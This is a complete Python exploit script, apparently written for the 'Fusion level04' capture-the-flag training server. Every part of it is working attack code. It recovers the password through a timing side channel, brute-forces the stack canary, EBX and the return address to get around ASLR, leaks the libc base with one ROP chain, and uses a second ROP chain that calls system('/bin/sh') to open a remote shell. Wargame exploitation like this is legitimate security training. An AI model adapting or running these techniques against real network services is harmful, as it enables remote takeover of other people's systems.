import argparse
import base64
import binascii
import collections
import time
import string
import sys
from pwn import *

# You will need to install pwntools to run this exploit.

# You should also install the libc database along with this exploit
# https://github.com/niklasb/libc-database

# Written walkthrough:
# Video walkthrough:

# Pwn context
context.arch = 'i386'

# Environment
PASSWORD_LEN = 16                                                                       # The hard-coded length of the app's password
TARGET_ELF = ELF('./level04')                                                           # Executable to search for PLT offsets
TARGET_LIBC = ELF('/home/kali/tools/libc-database/db/libc6_2.13-20ubuntu5_i386.so')     # LIBC matching that on the remote system

def make_payload(args, overflow):
    payload = b"".join([
      b"GET / HTTP/1.0\r\n",
      b"Host: " + args.host.encode('utf-8') + b":" + str(args.port).encode('UTF-8') + b"\r\n"
      b"User-Agent: curl/7.72.0\r\n"
      b"Accept: */*\r\n"
      b"Authorization: Basic ",
      base64.b64encode(b":" + overflow),
      b"\r\n\r\n"
    ])
    return payload

def compute_roundtrips(args, guessed_bytes=b""):
    roundtrips = []
    invalid_byte = b"\xff" # Character outside the alphanumeric range
    invalid_byte_len = PASSWORD_LEN - len(guessed_bytes)
    overflow = guessed_bytes + invalid_byte * invalid_byte_len
    for _ in range(args.delay_loops):
        conn = remote(args.host, args.port)
        payload = make_payload(args, overflow)
        start = time.time()
        conn.send(payload)
        conn.recvall()
        roundtrips.append(time.time() - start)
        conn.close()
    return roundtrips

def leak_password(args):
    alphabet = string.ascii_lowercase + string.ascii_uppercase + string.digits
    password = bytearray(b"\xff" * PASSWORD_LEN)
    print('Leaking password: ', end='')
    for i in range(PASSWORD_LEN):
        context.log_level = 'warn'
        counter = collections.Counter()
        for c in alphabet:
            password[i] = ord(c.encode('utf-8'))
            roundtrips = compute_roundtrips(args, password)
            average_roundtrip_time = sum(roundtrips) / len(roundtrips)
            counter[c] = average_roundtrip_time
        guessed_character = min(counter, key=counter.get)
        password[i] = ord(guessed_character.encode('utf-8'))
        context.log_level = 'info'
        print(f'{guessed_character}', end='')
    print("\n")
    return password

def leak_canary(args, password):
    context.log_level = 'error'
    print('Leaking stack canary: ', end='\r')
    x86_addr_len = 4
    canary = b""
    while len(canary) < x86_addr_len:
        for b in range(0xff):
            conn = remote(args.host, args.port)

            # Overflow occurs in the password
            padding = b"A" * (2048 - len(password)- 1)
            overflow = b"".join([
                password,
                padding,
                canary,
                bytes([b])
            ])
            payload = make_payload(args, overflow)
            conn.send(payload)
            data = conn.recvall()
            conn.close()

            if b'stack smashing' not in data:
                canary += bytes([b])
                print(b, end='\r')
                break
            print('.', end='')

    print("\n")
    context.log_level = 'info'
    info(f'Stack canary: {hex(u32(canary))}')
    return canary

def leak_ebx(args, password, canary):
    context.log_level = 'warn'
    print('Leaking EBX: ', end='\r')
    x86_addr_len = 4
    padding = b"A" * (2048 - len(password)- 1)
    post_canary_padding = b""
    post_canary_eip_offset = 0x1c
    post_canary_ebx_offset = post_canary_eip_offset - 0x10
    post_canary_ebx_padding = b"A" * post_canary_ebx_offset
    ebx = b""
    while len(ebx) < x86_addr_len:
        for b in range(0xff):
            conn = remote(args.host, args.port)
            overflow = b"".join([
                password,
                padding,
                canary,
                post_canary_ebx_padding,
                ebx,
                bytes([b])
            ])
            payload = make_payload(args, overflow)
            conn.send(payload)
            data = conn.recvall()
            conn.close()

            if b"HTTP/1.0 200 Ok" in data:
                ebx += bytes([b])
                print(b, end='\r')
                break
            print('.', end='')

    print("\n")
    context.log_level = 'info'
    ebx = u32(ebx)
    info(f'EBX: {hex(ebx)}')
    return ebx

    
def leak_elf_base_address(args, password, canary, ebx):
    context.log_level = 'error'
    print('Leaking return address: ', end='\r')
    x86_addr_len = 4
    padding = b"A" * (2048 - len(password)- 1)
    post_canary_padding = b""
    post_canary_eip_offset = 0x1c
    post_canary_ebx_offset = post_canary_eip_offset - 0x10
    post_canary_ebx_padding = b"A" * post_canary_ebx_offset
    post_ebx_return_address_offset = post_canary_ebx_offset + 0x0c
    post_ebx_return_address_padding = b"A" * 0x0c
    return_address = b""
    while len(return_address) < x86_addr_len:
        for b in range(0xff):
            conn = remote(args.host, args.port)
            overflow = b"".join([
                password,
                padding,
                canary,
                post_canary_ebx_padding,
                p32(ebx),
                post_ebx_return_address_padding,
                return_address,
                bytes([b])
            ])
            payload = make_payload(args, overflow)
            conn.send(payload)
            data = conn.recvall()
            conn.close()

            if b"HTTP/1.0 200 Ok" in data:
                return_address += bytes([b])
                print(b, end='\r')
                break
            print('.', end='')

    print("\n")
    context.log_level = 'info'
    return_address = u32(return_address)
    info(f'Return Address: {hex(return_address)}')

    # We know that the webserver() function is the caller of the overflowed function.
    # Therefore, from GDB, it returns 325 bytes into the function

    webserver = TARGET_ELF.sym['webserver']
    webserver_offset = 325 # Discovered with GDB analysis
    base_address = return_address - webserver - webserver_offset
    info(f'Calculated Base Address: {hex(base_address)}')
    return base_address

def leak_libc_base_address(args, password, canary, ebx, elf_base_address):
    context.log_level = 'debug'

    rop = ROP(TARGET_ELF)

    # A small ROP chain to leak __libc_start_main from the GOT
    # __printf_chk(0, __libc_start_main);
    # exit();
    rop.raw(p32(elf_base_address + TARGET_ELF.sym['__printf_chk']))
    rop.raw(p32(elf_base_address + TARGET_ELF.plt['exit']))
    rop.raw(p32(0))
    rop.raw(p32(elf_base_address + TARGET_ELF.got['__libc_start_main']))
    return_address = rop.chain()

    conn = remote(args.host, args.port)
    padding = b"A" * (2048 - len(password)- 1)
    post_canary_padding = b""
    post_canary_eip_offset = 0x1c
    post_canary_ebx_offset = post_canary_eip_offset - 0x10
    post_canary_ebx_padding = b"A" * post_canary_ebx_offset
    post_ebx_return_address_offset = post_canary_ebx_offset + 0x0c
    post_ebx_return_address_padding = b"A" * 0x0c

    overflow = b"".join([
        password,
        padding,
        canary,
        post_canary_ebx_padding,
        p32(ebx),
        post_ebx_return_address_padding,
        return_address
    ])

    payload = make_payload(args, overflow)
    conn.send(payload)
    data = conn.recvall()
    leaked_libc_start_main = u32(data[:4])
    conn.close()

    info(f'Leaked __libc_start_main at {hex(leaked_libc_start_main)}')

    libc_start_main = TARGET_LIBC.sym['__libc_start_main']
    libc_base_address = leaked_libc_start_main - libc_start_main
    info(f'Libc base address: {hex(libc_base_address)}')
    return libc_base_address

def do_rop(args, password, canary, ebx, libc_base_address):
    context.log_level = 'info'

    rop = ROP(TARGET_LIBC)
    pop_ret = rop.search(0x8).address
    bin_sh = next(TARGET_LIBC.search(b"/bin/sh\x00"))
    system = TARGET_LIBC.sym['system']

    rop.raw(p32(libc_base_address + system))
    rop.raw(p32(libc_base_address + pop_ret)) 
    rop.raw(p32(libc_base_address + bin_sh)) 
    return_address = rop.chain()

    conn = remote(args.host, args.port)
    padding = b"A" * (2048 - len(password)- 1)
    post_canary_padding = b""
    post_canary_eip_offset = 0x1c
    post_canary_ebx_offset = post_canary_eip_offset - 0x10
    post_canary_ebx_padding = b"A" * post_canary_ebx_offset
    post_ebx_return_address_offset = post_canary_ebx_offset + 0x0c
    post_ebx_return_address_padding = b"A" * 0x0c

    overflow = b"".join([
        password,
        padding,
        canary,
        post_canary_ebx_padding,
        p32(ebx),
        post_ebx_return_address_padding,
        return_address
    ])
    payload = make_payload(args, overflow)

    # Pop a shell
    info('Popping a shell...')
    conn.send(payload)
    conn.interactive()

def exploit(args):
    password = leak_password(args)
    canary = leak_canary(args, password)
    ebx = leak_ebx(args, password, canary)
    elf_base_address = leak_elf_base_address(args, password, canary, ebx)
    libc_base_address = leak_libc_base_address(args, password, canary, ebx, elf_base_address)
    do_rop(args, password, canary, ebx, libc_base_address)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Fusion level04 exploit by r0kit.')
    parser.add_argument('--host', dest='host', type=str, required=True)
    parser.add_argument('--port', dest='port', type=int, default=20004)
    parser.add_argument('--password-leak-delay-loops', dest='delay_loops', type=int, default=10)

    try:
        args = parser.parse_args()
        exploit(args)
        
    except argparse.ArgumentError as e:
        print("[!] {}".format(e))
        parser.print_usage()
        sys.exit(1)
